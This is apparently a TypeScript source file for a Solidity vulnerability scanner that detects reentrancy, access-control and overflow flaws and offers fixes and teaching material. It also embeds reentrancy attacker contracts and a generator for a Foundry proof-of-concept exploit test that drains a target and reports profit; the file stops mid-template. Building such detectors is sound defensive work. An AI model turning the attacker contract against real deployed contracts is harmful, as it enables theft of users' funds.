import * as parser from '@solidity-parser/parser';
import {
  ParsedContract,
  ContractInfo,
  FunctionInfo,
  StateVariableInfo,
  ModifierInfo,
  ParameterInfo,
  Vulnerability,
  VulnerabilityType,
  AnalysisResult,
  ConfidenceLevel,
  VulnerabilityMetadata,
  SafetyCheck,
  AnalysisLimitations,
  FixSuggestion,
  EducationalContent,
} from './types';

// ============= CONFIDENCE SCORING =============

function scoreToConfidenceLevel(score: number): ConfidenceLevel {
  if (score >= 70) return 'confirmed';
  if (score >= 40) return 'likely';
  return 'theoretical';
}

// Static limitations that apply to all analyses
const ANALYSIS_LIMITATIONS: AnalysisLimitations = {
  covered: [
    'Reentrancy via external calls (.call, .send, .delegatecall)',
    'Missing access control on sensitive functions',
    'Integer overflow/underflow (Solidity < 0.8.0)',
    'Unprotected selfdestruct calls',
  ],
  notCovered: [
    'Governance attacks (malicious proposals)',
    'Social engineering (phishing, key theft)',
    'Oracle manipulation (off-chain data feeds)',
    'Flash loan attacks',
    'Front-running / MEV attacks',
    'Time-based attacks (timestamp manipulation)',
    'Malicious proxy upgrades',
    'Business logic flaws',
    'Economic attacks requiring market conditions',
    'Cross-contract vulnerabilities',
    'Off-chain dependencies',
  ],
  disclaimer: 'This tool performs static pattern analysis only. For comprehensive security, a professional audit is required. This tool is ONE layer of defense, not a complete security solution.',
};

// ============= REENTRANCY FIX SUGGESTIONS =============

function generateReentrancyFixSuggestions(functionName: string): FixSuggestion[] {
  return [
    {
      name: 'Checks-Effects-Interactions (CEI) Pattern',
      description: 'Reorder code to update state before making external calls. This is the recommended approach with zero gas overhead.',
      vulnerableCode: `function ${functionName}() external {
    uint256 bal = balances[msg.sender];
    require(bal > 0, "No balance");

    // VULNERABLE: External call BEFORE state update
    (bool success, ) = msg.sender.call{value: bal}("");
    require(success, "Transfer failed");

    balances[msg.sender] = 0;  // TOO LATE!
}`,
      fixedCode: `function ${functionName}() external {
    uint256 bal = balances[msg.sender];
    require(bal > 0, "No balance");

    // SAFE: State update BEFORE external call
    balances[msg.sender] = 0;

    (bool success, ) = msg.sender.call{value: bal}("");
    require(success, "Transfer failed");
}`,
      gasImpact: 'None',
      pros: ['No additional gas cost', 'Follows industry best practices', 'No external dependencies'],
      cons: ['Requires careful code review', 'Must ensure ALL state is updated first'],
      recommended: true,
    },
    {
      name: 'ReentrancyGuard (OpenZeppelin)',
      description: 'Use OpenZeppelin\'s battle-tested ReentrancyGuard modifier to prevent reentrancy attacks.',
      vulnerableCode: `contract Vault {
    function ${functionName}() external {
        // Vulnerable to reentrancy
    }
}`,
      fixedCode: `import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Vault is ReentrancyGuard {
    function ${functionName}() external nonReentrant {
        // Protected by ReentrancyGuard
        // Even if external call is before state update,
        // recursive calls will revert
    }
}`,
      gasImpact: '+2,300 gas per call',
      pros: ['Battle-tested and widely audited', 'Easy to implement', 'Works regardless of code order'],
      cons: ['Adds external dependency', 'Gas overhead on every call', 'Must inherit from contract'],
      recommended: false,
    },
    {
      name: 'Mutex Lock (Manual)',
      description: 'Implement a simple boolean lock to prevent reentrant calls. Lightweight alternative to OpenZeppelin.',
      vulnerableCode: `contract Vault {
    function ${functionName}() external {
        // Vulnerable to reentrancy
    }
}`,
      fixedCode: `contract Vault {
    bool private locked;

    modifier noReentrant() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }

    function ${functionName}() external noReentrant {
        // Protected by mutex lock
    }
}`,
      gasImpact: '+200 gas per call',
      pros: ['Simple to understand', 'No external dependencies', 'Minimal gas overhead'],
      cons: ['Must remember to add modifier', 'Manual implementation risk', 'Not as widely audited'],
      recommended: false,
    },
    {
      name: 'Pull-over-Push Pattern',
      description: 'Instead of pushing funds to users, let them pull (withdraw) their own funds. This is the safest pattern but requires architectural changes.',
      vulnerableCode: `// PUSH pattern (vulnerable)
function distribute(address[] recipients) external {
    for (uint i = 0; i < recipients.length; i++) {
        recipients[i].call{value: amounts[i]}("");
    }
}`,
      fixedCode: `// PULL pattern (safe)
mapping(address => uint256) public pendingWithdrawals;

function claimable(address user) external view returns (uint256) {
    return pendingWithdrawals[user];
}

function ${functionName}() external {
    uint256 amount = pendingWithdrawals[msg.sender];
    require(amount > 0, "Nothing to withdraw");

    pendingWithdrawals[msg.sender] = 0;

    // User pulls their own funds
    payable(msg.sender).transfer(amount);
}`,
      gasImpact: 'None (may reduce overall gas)',
      pros: ['Safest pattern', 'User controls when to withdraw', 'Works well with gas limits'],
      cons: ['Requires architectural refactor', 'Users must initiate withdrawal', 'More complex UX'],
      recommended: false,
    },
  ];
}

// ============= REENTRANCY EDUCATIONAL CONTENT =============

function generateReentrancyEducation(functionName: string, contractName: string): EducationalContent {
  return {
    realWorldExample: {
      name: 'The DAO Hack',
      date: 'June 17, 2016',
      impact: '$60 million stolen (3.6 million ETH)',
      description: `The DAO was a decentralized venture capital fund on Ethereum. An attacker exploited a reentrancy vulnerability in the splitDAO() function, which allowed withdrawing funds before the balance was updated. The attacker recursively called the withdraw function, draining approximately 3.6 million ETH. This led to the controversial Ethereum hard fork, splitting the chain into ETH and ETC.`,
    },
    attackFlow: [
      {
        step: 1,
        title: 'Setup',
        description: `Attacker deploys a malicious contract with a receive() or fallback() function that calls ${contractName}.${functionName}() when it receives ETH.`,
        codeSnippet: `contract Attacker {
    ${contractName} target;

    constructor(address _target) {
        target = ${contractName}(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.${functionName}();
    }

    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.${functionName}();  // Re-enter!
        }
    }
}`,
      },
      {
        step: 2,
        title: 'Attack Execution',
        description: `When ${functionName}() sends ETH to the attacker contract, the receive() function is triggered. Since the victim's balance hasn't been updated yet, the attacker can call ${functionName}() again, receiving more ETH each time.`,
        codeSnippet: `// In victim contract:
function ${functionName}() external {
    uint256 bal = balances[msg.sender];

    // 1. Check passes (attacker has balance)
    require(bal > 0);

    // 2. Send ETH - triggers attacker's receive()
    msg.sender.call{value: bal}("");
    //    └─> Attacker re-enters here!

    // 3. This line never reached during attack
    balances[msg.sender] = 0;
}`,
      },
      {
        step: 3,
        title: 'Impact',
        description: 'The attacker drains the contract by repeatedly withdrawing before their balance is set to zero. With 1 ETH deposited, an attacker can drain the entire contract balance.',
        codeSnippet: `// Attack flow:
// 1. Attacker deposits 1 ETH
// 2. Attacker calls withdraw()
// 3. Contract sends 1 ETH → triggers receive()
// 4. receive() calls withdraw() again
// 5. Contract sends another 1 ETH (balance still shows 1!)
// 6. Repeat until contract is empty
// 7. Finally, balances[attacker] = 0 executes

// Result: From 1 ETH, attacker steals entire contract balance`,
      },
    ],
    keyLesson: 'Always follow the Checks-Effects-Interactions pattern: perform all state changes (effects) before making external calls (interactions). The check-then-update-then-call order prevents reentrancy attacks.',
  };
}

// ============= PARSER =============

export function parseSource(source: string): { ast: unknown; parsed: ParsedContract } {
  const ast = parser.parse(source, {
    loc: true,
    range: true,
    tolerant: true,
  });

  const parsed = extractContractInfo(ast);
  return { ast, parsed };
}

function extractContractInfo(ast: unknown): ParsedContract {
  const result: ParsedContract = {
    contracts: [],
    pragmaVersion: null,
    imports: [],
  };

  const astNode = ast as { children?: unknown[] };
  for (const node of astNode.children || []) {
    const n = node as { type: string; name?: string; value?: string; path?: string };
    if (n.type === 'PragmaDirective' && n.name === 'solidity') {
      result.pragmaVersion = n.value || null;
    }
    if (n.type === 'ImportDirective') {
      result.imports.push(n.path || '');
    }
    if (n.type === 'ContractDefinition') {
      result.contracts.push(extractContract(node));
    }
  }

  return result;
}

function extractContract(node: unknown): ContractInfo {
  const n = node as {
    name: string;
    kind: string;
    baseContracts?: { baseName: { namePath: string } }[];
    subNodes?: unknown[];
  };

  const contract: ContractInfo = {
    name: n.name,
    kind: n.kind,
    baseContracts: (n.baseContracts || []).map((bc) => bc.baseName.namePath),
    functions: [],
    stateVariables: [],
    modifiers: [],
  };

  for (const subNode of n.subNodes || []) {
    const sub = subNode as { type: string; variables?: unknown[] };
    if (sub.type === 'FunctionDefinition') {
      contract.functions.push(extractFunction(subNode));
    }
    if (sub.type === 'StateVariableDeclaration') {
      for (const variable of sub.variables || []) {
        contract.stateVariables.push(extractStateVariable(variable, subNode));
      }
    }
    if (sub.type === 'ModifierDefinition') {
      contract.modifiers.push(extractModifier(subNode));
    }
  }

  return contract;
}

function extractFunction(node: unknown): FunctionInfo {
  const n = node as {
    name?: string;
    isConstructor?: boolean;
    isFallback?: boolean;
    visibility?: string;
    stateMutability?: string;
    modifiers?: { name: string }[];
    parameters?: unknown[];
    body?: unknown;
    loc?: { start?: { line: number } };
  };

  return {
    name: n.name || (n.isConstructor ? 'constructor' : n.isFallback ? 'fallback' : 'receive'),
    visibility: n.visibility || 'public',
    stateMutability: n.stateMutability || 'nonpayable',
    modifiers: (n.modifiers || []).map((m) => m.name),
    parameters: (n.parameters || []).map(extractParameter),
    body: n.body,
    line: n.loc?.start?.line || 0,
  };
}

function extractParameter(node: unknown): ParameterInfo {
  const n = node as { name?: string; typeName?: unknown };
  return {
    name: n.name || '',
    typeName: getTypeName(n.typeName),
  };
}

function extractStateVariable(variable: unknown, declaration: unknown): StateVariableInfo {
  const v = variable as { name: string; typeName?: unknown; visibility?: string };
  const d = declaration as { loc?: { start?: { line: number } } };
  return {
    name: v.name,
    typeName: getTypeName(v.typeName),
    visibility: v.visibility || 'internal',
    line: d.loc?.start?.line || 0,
  };
}

function extractModifier(node: unknown): ModifierInfo {
  const n = node as {
    name: string;
    parameters?: unknown[];
    loc?: { start?: { line: number } };
  };
  return {
    name: n.name,
    parameters: (n.parameters || []).map(extractParameter),
    line: n.loc?.start?.line || 0,
  };
}

function getTypeName(typeNode: unknown): string {
  if (!typeNode) return 'unknown';
  const t = typeNode as {
    type: string;
    name?: string;
    namePath?: string;
    keyType?: unknown;
    valueType?: unknown;
    baseTypeName?: unknown;
  };

  if (t.type === 'ElementaryTypeName') return t.name || 'unknown';
  if (t.type === 'UserDefinedTypeName') return t.namePath || 'unknown';
  if (t.type === 'Mapping') {
    return `mapping(${getTypeName(t.keyType)} => ${getTypeName(t.valueType)})`;
  }
  if (t.type === 'ArrayTypeName') {
    return `${getTypeName(t.baseTypeName)}[]`;
  }
  return 'unknown';
}

// ============= VULNERABILITY DETECTOR =============

let vulnerabilityCounter = 0;

function generateId(type: VulnerabilityType): string {
  vulnerabilityCounter++;
  return `${type.toUpperCase()}-${vulnerabilityCounter.toString().padStart(3, '0')}`;
}

export function detectVulnerabilities(parsed: ParsedContract): Vulnerability[] {
  const vulnerabilities: Vulnerability[] = [];
  vulnerabilityCounter = 0;

  for (const contract of parsed.contracts) {
    if (contract.kind === 'interface' || contract.kind === 'library') continue;

    vulnerabilities.push(...detectReentrancy(contract));
    vulnerabilities.push(...detectAccessControl(contract));
    vulnerabilities.push(...detectIntegerOverflow(contract, parsed.pragmaVersion));
  }

  return vulnerabilities;
}

interface ExternalCallInfo {
  type: string;
  line: number;
}

interface StateChangeInfo {
  variableName: string;
  line: number;
}

function findExternalCalls(body: unknown): ExternalCallInfo[] {
  const calls: ExternalCallInfo[] = [];

  function traverse(node: unknown, parentLine?: number) {
    if (!node) return;
    const n = node as {
      type?: string;
      expression?: unknown;
      loc?: { start?: { line: number } };
    };

    const currentLine = n.loc?.start?.line || parentLine;

    if (n.type === 'FunctionCall') {
      let expr = n.expression as { type?: string; expression?: unknown; memberName?: string };
      if (expr?.type === 'NameValueExpression') {
        expr = (expr as { expression?: unknown }).expression as typeof expr;
      }
      if (expr?.type === 'MemberAccess') {
        const memberName = expr.memberName;
        if (['call', 'send', 'transfer', 'delegatecall', 'staticcall'].includes(memberName || '')) {
          calls.push({ type: memberName || '', line: currentLine || 0 });
        }
      }
    }

    for (const key in n) {
      const val = (n as Record<string, unknown>)[key];
      if (val && typeof val === 'object') {
        if (Array.isArray(val)) {
          for (const child of val) traverse(child, currentLine);
        } else {
          traverse(val, currentLine);
        }
      }
    }
  }

  traverse(body);
  return calls;
}

function findStateChanges(body: unknown): StateChangeInfo[] {
  const changes: StateChangeInfo[] = [];

  function getVariableName(node: unknown): string {
    const n = node as { type?: string; name?: string; base?: unknown; expression?: unknown; memberName?: string };
    if (n.type === 'Identifier') return n.name || 'unknown';
    if (n.type === 'IndexAccess') return getVariableName(n.base);
    if (n.type === 'MemberAccess') return `${getVariableName(n.expression)}.${n.memberName}`;
    return 'unknown';
  }

  function traverse(node: unknown, parentLine?: number) {
    if (!node) return;
    const n = node as {
      type?: string;
      expression?: unknown;
      operator?: string;
      left?: unknown;
      loc?: { start?: { line: number } };
    };

    const currentLine = n.loc?.start?.line || parentLine;

    if (n.type === 'ExpressionStatement') {
      const expr = n.expression as { type?: string; operator?: string; left?: unknown };
      if (expr?.type === 'BinaryOperation' && ['=', '+=', '-=', '*=', '/='].includes(expr.operator || '')) {
        const left = expr.left as { type?: string };
        if (left?.type === 'Identifier' || left?.type === 'IndexAccess') {
          changes.push({ variableName: getVariableName(left), line: currentLine || 0 });
        }
      }
    }

    if (n.type === 'BinaryOperation' && ['=', '+=', '-=', '*=', '/='].includes(n.operator || '')) {
      const left = n.left as { type?: string };
      if (left?.type === 'Identifier' || left?.type === 'IndexAccess') {
        changes.push({ variableName: getVariableName(left), line: currentLine || 0 });
      }
    }

    for (const key in n) {
      const val = (n as Record<string, unknown>)[key];
      if (val && typeof val === 'object') {
        if (Array.isArray(val)) {
          for (const child of val) traverse(child, currentLine);
        } else {
          traverse(val, currentLine);
        }
      }
    }
  }

  traverse(body);
  return changes;
}

function detectReentrancy(contract: ContractInfo): Vulnerability[] {
  const vulnerabilities: Vulnerability[] = [];
  const reentrancyGuardModifiers = ['nonReentrant', 'noReentrant', 'reentrancyGuard'];

  for (const func of contract.functions) {
    if (!func.body) continue;
    if (func.stateMutability === 'view' || func.stateMutability === 'pure') continue;

    const externalCalls = findExternalCalls(func.body);
    const stateChanges = findStateChanges(func.body);

    // Check for reentrancy guard modifier
    const hasReentrancyGuard = func.modifiers.some((mod) =>
      reentrancyGuardModifiers.some((guard) => mod.toLowerCase().includes(guard.toLowerCase()))
    );

    for (const call of externalCalls) {
      if (!['call', 'send', 'delegatecall'].includes(call.type)) continue;

      const stateChangesAfterCall = stateChanges.filter((sc) => sc.line > call.line);

      if (stateChangesAfterCall.length > 0) {
        // Calculate confidence score
        const confidenceFactors: string[] = [];
        let score = 20; // Base score

        // External call before state update is the key pattern
        score += 40;
        confidenceFactors.push('External call occurs before state update (+40)');

        // No reentrancy guard increases confidence
        if (!hasReentrancyGuard) {
          score += 20;
          confidenceFactors.push('No reentrancy guard modifier found (+20)');
        } else {
          score -= 30;
          confidenceFactors.push('Reentrancy guard modifier present (-30)');
        }

        // Balance-related state changes increase confidence
        const varName = stateChangesAfterCall[0].variableName.toLowerCase();
        if (varName.includes('balance') || varName.includes('amount') || varName.includes('fund')) {
          score += 20;
          confidenceFactors.push('State variable appears balance-related (+20)');
        }

        // .call is more dangerous than .send or .transfer
        if (call.type === 'call') {
          score += 10;
          confidenceFactors.push('Uses .call() which forwards all gas (+10)');
        }

        const metadata: VulnerabilityMetadata = {
          environment: 'Any EVM-compatible chain',
          assumptions: [
            'Attacker can deploy a malicious contract',
            'Target function is externally callable',
            'Contract has sufficient balance to exploit',
          ],
          preconditions: [
            `Function ${func.name}() is ${func.visibility}`,
            'Attacker needs initial funds for deposit (if required)',
            'No external reentrancy protection in place',
          ],
          protectivePatterns: hasReentrancyGuard
            ? ['ReentrancyGuard modifier detected']
            : ['No reentrancy protection detected'],
        };

        vulnerabilities.push({
          id: generateId('reentrancy'),
          type: 'reentrancy',
          severity: 'CRITICAL',
          title: `Reentrancy vulnerability in ${func.name}()`,
          description: `External ${call.type}() at line ${call.line} occurs before state variable update at line ${stateChangesAfterCall[0].line}. An attacker can recursively call ${func.name}() before the state is updated.`,
          location: {
            line: call.line,
            column: 0,
            functionName: func.name,
            contractName: contract.name,
          },
          attackVector: `External call (${call.type}) before state update (${stateChangesAfterCall[0].variableName})`,
          recommendation:
            'Apply the Checks-Effects-Interactions pattern: update state variables before making external calls. Consider using ReentrancyGuard from OpenZeppelin.',
          exploitable: true,
          confidence: scoreToConfidenceLevel(score),
          confidenceScore: Math.min(100, Math.max(0, score)),
          confidenceFactors,
          metadata,
          fixSuggestions: generateReentrancyFixSuggestions(func.name),
          educational: generateReentrancyEducation(func.name, contract.name),
        });
      }
    }
  }

  return vulnerabilities;
}

function containsMsgSender(node: unknown): boolean {
  if (!node) return false;
  const n = node as { type?: string; expression?: unknown; memberName?: string; name?: string };

  if (
    n.type === 'MemberAccess' &&
    (n.expression as { type?: string; name?: string })?.type === 'Identifier' &&
    (n.expression as { name?: string })?.name === 'msg' &&
    n.memberName === 'sender'
  ) {
    return true;
  }

  for (const key in n) {
    const val = (n as Record<string, unknown>)[key];
    if (val && typeof val === 'object') {
      if (Array.isArray(val)) {
        for (const child of val) {
          if (containsMsgSender(child)) return true;
        }
      } else {
        if (containsMsgSender(val)) return true;
      }
    }
  }

  return false;
}

function checkForMsgSenderRequire(body: unknown): boolean {
  if (!body) return false;
  let found = false;

  function traverse(node: unknown) {
    if (!node || found) return;
    const n = node as { type?: string; expression?: unknown; arguments?: unknown[] };

    if (n.type === 'FunctionCall') {
      const expr = n.expression as { type?: string; name?: string };
      if (expr?.type === 'Identifier' && expr.name === 'require') {
        for (const arg of n.arguments || []) {
          if (containsMsgSender(arg)) {
            found = true;
            return;
          }
        }
      }
    }

    for (const key in n) {
      const val = (n as Record<string, unknown>)[key];
      if (val && typeof val === 'object') {
        if (Array.isArray(val)) {
          for (const child of val) traverse(child);
        } else {
          traverse(val);
        }
      }
    }
  }

  traverse(body);
  return found;
}

function detectAccessControl(contract: ContractInfo): Vulnerability[] {
  const vulnerabilities: Vulnerability[] = [];

  const sensitivePatterns = [
    'mint', 'burn', 'pause', 'unpause', 'setOwner', 'changeOwner', 'updateOwner',
    'setAdmin', 'upgrade', 'destroy', 'selfdestruct', 'kill', 'setPrice', 'setFee',
    'transferOwnership', 'renounceOwnership',
  ];

  const accessControlModifiers = [
    'onlyOwner', 'onlyAdmin', 'onlyRole', 'onlyAuthorized', 'restricted', 'auth', 'authorized', 'requiresAuth',
  ];

  for (const func of contract.functions) {
    if (func.visibility === 'private' || func.visibility === 'internal') continue;
    if (['constructor', 'fallback', 'receive'].includes(func.name)) continue;

    const matchedPattern = sensitivePatterns.find((p) => func.name.toLowerCase().includes(p.toLowerCase()));
    if (!matchedPattern) continue;

    const hasAccessControl = func.modifiers.some((mod) =>
      accessControlModifiers.some((ac) => mod.toLowerCase().includes(ac.toLowerCase()))
    );
    const hasRequireSender = checkForMsgSenderRequire(func.body);

    if (!hasAccessControl && !hasRequireSender) {
      // Calculate confidence score
      const confidenceFactors: string[] = [];
      let score = 20; // Base score

      // Sensitive function name pattern
      score += 30;
      confidenceFactors.push(`Function name matches sensitive pattern "${matchedPattern}" (+30)`);

      // No access control modifier
      score += 30;
      confidenceFactors.push('No access control modifier found (+30)');

      // No msg.sender require check
      score += 20;
      confidenceFactors.push('No msg.sender validation in function body (+20)');

      // External visibility is more dangerous
      if (func.visibility === 'external') {
        score += 10;
        confidenceFactors.push('Function is external (more exposed) (+10)');
      }

      const metadata: VulnerabilityMetadata = {
        environment: 'Any EVM-compatible chain',
        assumptions: [
          'Function performs a privileged operation',
          'No off-chain access control mechanism exists',
          'Contract is deployed and accessible',
        ],
        preconditions: [
          `Function ${func.name}() is ${func.visibility}`,
          'Attacker has a valid Ethereum address',
          'Function does not have hidden access checks',
        ],
        protectivePatterns: ['No access control modifiers detected', 'No msg.sender validation detected'],
      };

      vulnerabilities.push({
        id: generateId('access-control'),
        type: 'access-control',
        severity: 'HIGH',
        title: `Missing access control in ${func.name}()`,
        description: `The function ${func.name}() appears to be a sensitive function but lacks access control modifiers.`,
        location: {
          line: func.line,
          column: 0,
          functionName: func.name,
          contractName: contract.name,
        },
        attackVector: `Any address can call ${func.name}() without authorization`,
        recommendation: 'Add an appropriate access control modifier (e.g., onlyOwner) to restrict who can call this function.',
        exploitable: true,
        confidence: scoreToConfidenceLevel(score),
        confidenceScore: Math.min(100, Math.max(0, score)),
        confidenceFactors,
        metadata,
      });
    }
  }

  return vulnerabilities;
}

function extractVersion(pragma: string): { major: number; minor: number } | null {
  const match = pragma.match(/(\d+)\.(\d+)/);
  if (match) {
    return { major: parseInt(match[1], 10), minor: parseInt(match[2], 10) };
  }
  return null;
}

function detectIntegerOverflow(contract: ContractInfo, pragmaVersion: string | null): Vulnerability[] {
  const vulnerabilities: Vulnerability[] = [];

  // Check if using Solidity 0.8+
  const version = pragmaVersion ? extractVersion(pragmaVersion) : null;
  const hasSolidity08Plus = version && version.minor >= 8;

  if (hasSolidity08Plus) {
    return []; // Solidity 0.8+ has built-in overflow checks
  }

  for (const func of contract.functions) {
    if (!func.body) continue;

    const ops = findArithmeticOperations(func.body);
    for (const op of ops) {
      const isOverflow = op.type === '+' || op.type === '*';
      const vulnType = isOverflow ? 'integer-overflow' : 'integer-underflow';

      // Calculate confidence score
      const confidenceFactors: string[] = [];
      let score = 0; // Base score for overflow

      // Solidity version is the primary factor
      if (!pragmaVersion) {
        score += 30;
        confidenceFactors.push('Solidity version unknown - assuming vulnerable (+30)');
      } else {
        score += 50;
        confidenceFactors.push(`Solidity ${pragmaVersion} lacks built-in overflow protection (+50)`);
      }

      // Multiplication and exponentiation are more dangerous
      if (op.type === '*' || op.type === '**') {
        score += 20;
        confidenceFactors.push(`${op.type === '*' ? 'Multiplication' : 'Exponentiation'} can overflow quickly (+20)`);
      } else {
        score += 10;
        confidenceFactors.push(`${op.type === '+' ? 'Addition' : 'Subtraction'} can overflow/underflow (+10)`);
      }

      const metadata: VulnerabilityMetadata = {
        environment: 'Any EVM-compatible chain',
        assumptions: [
          'No SafeMath or similar library is being used',
          'Input values are not validated before operation',
          'Result is not checked for overflow after operation',
        ],
        preconditions: [
          `Solidity version is ${pragmaVersion || 'unknown'} (< 0.8.0)`,
          'Attacker can influence input values',
          'No overflow validation exists',
        ],
        protectivePatterns: ['No SafeMath detected', 'No built-in overflow protection (Solidity < 0.8.0)'],
      };

      vulnerabilities.push({
        id: generateId(vulnType),
        type: vulnType,
        severity: 'HIGH',
        title: `Potential integer ${isOverflow ? 'overflow' : 'underflow'} in ${func.name}()`,
        description: `Arithmetic operation (${op.type}) at line ${op.line} may ${isOverflow ? 'overflow' : 'underflow'} in Solidity < 0.8.0.`,
        location: {
          line: op.line,
          column: 0,
          functionName: func.name,
          contractName: contract.name,
        },
        attackVector: `Supply values that cause the operation to ${isOverflow ? 'overflow' : 'underflow'}`,
        recommendation: 'Use SafeMath library or upgrade to Solidity 0.8.0+ which has built-in overflow checks.',
        exploitable: true,
        confidence: scoreToConfidenceLevel(score),
        confidenceScore: Math.min(100, Math.max(0, score)),
        confidenceFactors,
        metadata,
      });
    }
  }

  return vulnerabilities;
}

function findArithmeticOperations(body: unknown): { type: string; line: number }[] {
  const ops: { type: string; line: number }[] = [];

  function traverse(node: unknown, parentLine?: number) {
    if (!node) return;
    const n = node as { type?: string; operator?: string; loc?: { start?: { line: number } } };
    const currentLine = n.loc?.start?.line || parentLine;

    if (n.type === 'BinaryOperation' && ['+', '-', '*', '**'].includes(n.operator || '')) {
      ops.push({ type: n.operator || '', line: currentLine || 0 });
    }

    for (const key in n) {
      const val = (n as Record<string, unknown>)[key];
      if (val && typeof val === 'object') {
        if (Array.isArray(val)) {
          for (const child of val) traverse(child, currentLine);
        } else {
          traverse(val, currentLine);
        }
      }
    }
  }

  traverse(body);
  return ops;
}

// ============= EXPLOIT GENERATOR =============

export function generateExploitCode(vulnerabilities: Vulnerability[], contractName: string): string | null {
  const reentrancyVuln = vulnerabilities.find((v) => v.type === 'reentrancy');
  const funcName = reentrancyVuln?.location.functionName || 'withdraw';

  if (!reentrancyVuln) return null;

  return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * ============================================================================
 *                        REENTRANCY EXPLOIT TEST
 *                        ${contractName}.${funcName}()
 * ============================================================================
 *
 * HISTORICAL CONTEXT - THE DAO HACK (June 17, 2016):
 * This is the same vulnerability that enabled The DAO hack, one of the most
 * significant events in Ethereum history. An attacker exploited a reentrancy
 * bug in the splitDAO() function, draining 3.6 million ETH (~$60M at the time).
 * The incident led to the controversial Ethereum hard fork, splitting the chain
 * into ETH (Ethereum) and ETC (Ethereum Classic).
 *
 * ATTACK MECHANICS:
 * 1. Attacker deposits ETH into the vulnerable contract
 * 2. Attacker calls ${funcName}() to initiate withdrawal
 * 3. Contract sends ETH via .call() BEFORE updating the balance
 * 4. Attacker's receive() function re-enters ${funcName}()
 * 5. Steps 3-4 repeat until the contract is drained
 * 6. Finally, balance is set to 0 (but all funds are already gone)
 *
 * WHY IT WORKS:
 * The contract violates the Checks-Effects-Interactions (CEI) pattern.
 * The external call (Interaction) happens before the state update (Effect).
 *
 * GAS PROFILE (approximate):
 * - Contract deployment: ~200,000 gas
 * - Attacker deployment: ~150,000 gas
 * - Initial deposit: ~45,000 gas
 * - Attack execution: ~25,000 gas per iteration
 * - 5 iterations: ~125,000 gas
 * - Total attack cost: ~0.01 ETH at 50 gwei
 *
 * PROFIT CALCULATION:
 * - Investment: 1 ETH (deposit)
 * - Gas cost: ~0.01 ETH
 * - Stolen: Entire contract balance
 * - Net profit: (Contract balance - 1 ETH - gas)
 *
 * Run with: forge test --match-test testReentrancyExploit -vvvv
 * ============================================================================
 */

contract ReentrancyExploitTest is Test {
    ${contractName} public target;
    AttackerContract public attacker;

    // ========== CONSTANTS ==========
    uint256 constant VICTIM_INITIAL_DEPOSIT = 10 ether;  // Funds in contract
    uint256 constant ATTACKER_DEPOSIT = 1 ether;         // Attack investment
    uint256 constant MAX_ATTACK_ITERATIONS = 10;         // Prevent infinite loop

    // ========== SETUP ==========
    function setUp() public {
        // Step 1: Deploy the vulnerable contract
        target = new ${contractName}();
        console.log("Target deployed at:", address(target));

        // Step 2: Deploy the attacker contract
        attacker = new AttackerContract(payable(address(target)));
        console.log("Attacker deployed at:", address(attacker));

        // Step 3: Simulate victims depositing funds
        // In real scenario, this represents legitimate user deposits
        address victim = address(0x1);
        vm.deal(victim, VICTIM_INITIAL_DEPOSIT);
        vm.prank(victim);
        target.deposit{value: VICTIM_INITIAL_DEPOSIT}();
        console.log("Victim deposited:", VICTIM_INITIAL_DEPOSIT / 1 ether, "ETH");

        // Step 4: Fund the attacker
        vm.deal(address(attacker), ATTACKER_DEPOSIT + 1 ether); // +1 for gas
    }

    // ========== EXPLOIT TEST ==========
    function testReentrancyExploit() public {
        console.log("\\n========== ATTACK STARTING ==========");

        // Record initial state
        uint256 targetBalanceBefore = address(target).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;

        console.log("Target balance before:", targetBalanceBefore / 1 ether, "ETH");
        console.log("Attacker balance before:", attackerBalanceBefore / 1 ether, "ETH");

        // Measure gas usage
        uint256 gasStart = gasleft();

        // Execute the attack
        attacker.attack{value: ATTACKER_DEPOSIT}();

        uint256 gasUsed = gasStart - gasleft();

        // Record final state
        uint256 targetBalanceAfter = address(target).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;

        console.log("\\n========== ATTACK COMPLETE ==========");
        console.log("Target balance after:", targetBalanceAfter / 1 ether, "ETH");
        console.log("Attacker balance after:", attackerBalanceAfter / 1 ether, "ETH");
        console.log("ETH stolen:", (attackerBalanceAfter - attackerBalanceBefore + ATTACKER_DEPOSIT) / 1 ether, "ETH");
        console.log("Gas used:", gasUsed);
        console.log("Attack iterations:", attacker.attackCount());

        // Verify the attack succeeded
        assertLt(targetBalanceAfter, targetBalanceBefore, "Attack should drain funds");
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker should profit");

        // Calculate profit
        uint256 profit = attackerBalanceAfter - attackerBalanceBefore + ATTACKER_DEPOSIT;
        console.log("\\nNet profit:", profit / 1 ether, "ETH");
        console.log("ROI:", (profit * 100) / ATTACKER_DEPOSIT, "%");
    }

    // ========== HELPER: Test with different deposit amounts ==========
    function testReentrancyWithLargerDeposit() public {
        // Reset and use 5 ETH deposit
        vm.deal(address(attacker), 6 ether);
        uint256 stolen = attacker.attackWithAmount{value: 5 ether}();
        console.log("Stolen with 5 ETH deposit:", stolen / 1 ether, "ETH");
    }
}

/**
 * ============================================================================
 *                           ATTACKER CONTRACT
 * ============================================================================
 * This malicious contract exploits the reentrancy vulnerability by:
 * 1. Depositing ETH to become a legitimate user
 * 2. Calling withdraw to trigger the vulnerability
 * 3. Re-entering via receive() before balance is updated
 */
contract AttackerContract {
    ${contractName} public target;
    uint256 public attackCount;
    uint256 public constant MAX_ATTACKS = ${10};

    constructor(address payable _target) {
        target = ${contractName}(_target);
    }

    /**
     * @notice Execute the reentrancy attack
     * @dev Deposits ETH then triggers withdraw, which calls receive()
     */
    function attack() external payable {
        require(msg.value >= 0.1 ether, "Need ETH to attack");

        // Step 1: Deposit to become a user
        target.deposit{value: msg.value}();

        // Step 2: Trigger the vulnerable withdraw
        // This will send ETH to us, triggering receive()
        target.${funcName}();
    }

    /**
     * @notice Attack with specified amount and return stolen ETH
     */
    function attackWithAmount() external payable returns (uint256) {
        uint256 before = address(this).balance;
        target.deposit{value: msg.value}();
        target.${funcName}();
        return address(this).balance - before + msg.value;
    }

    /**
     * @notice This is where the magic happens - reentrancy!
     * @dev Called when we receive ETH from the vulnerable contract
     *
     * ATTACK FLOW:
     * 1. target.${funcName}() sends us ETH
     * 2. This receive() is triggered
     * 3. We immediately call ${funcName}() AGAIN
     * 4. target still thinks we have a balance (not updated yet!)
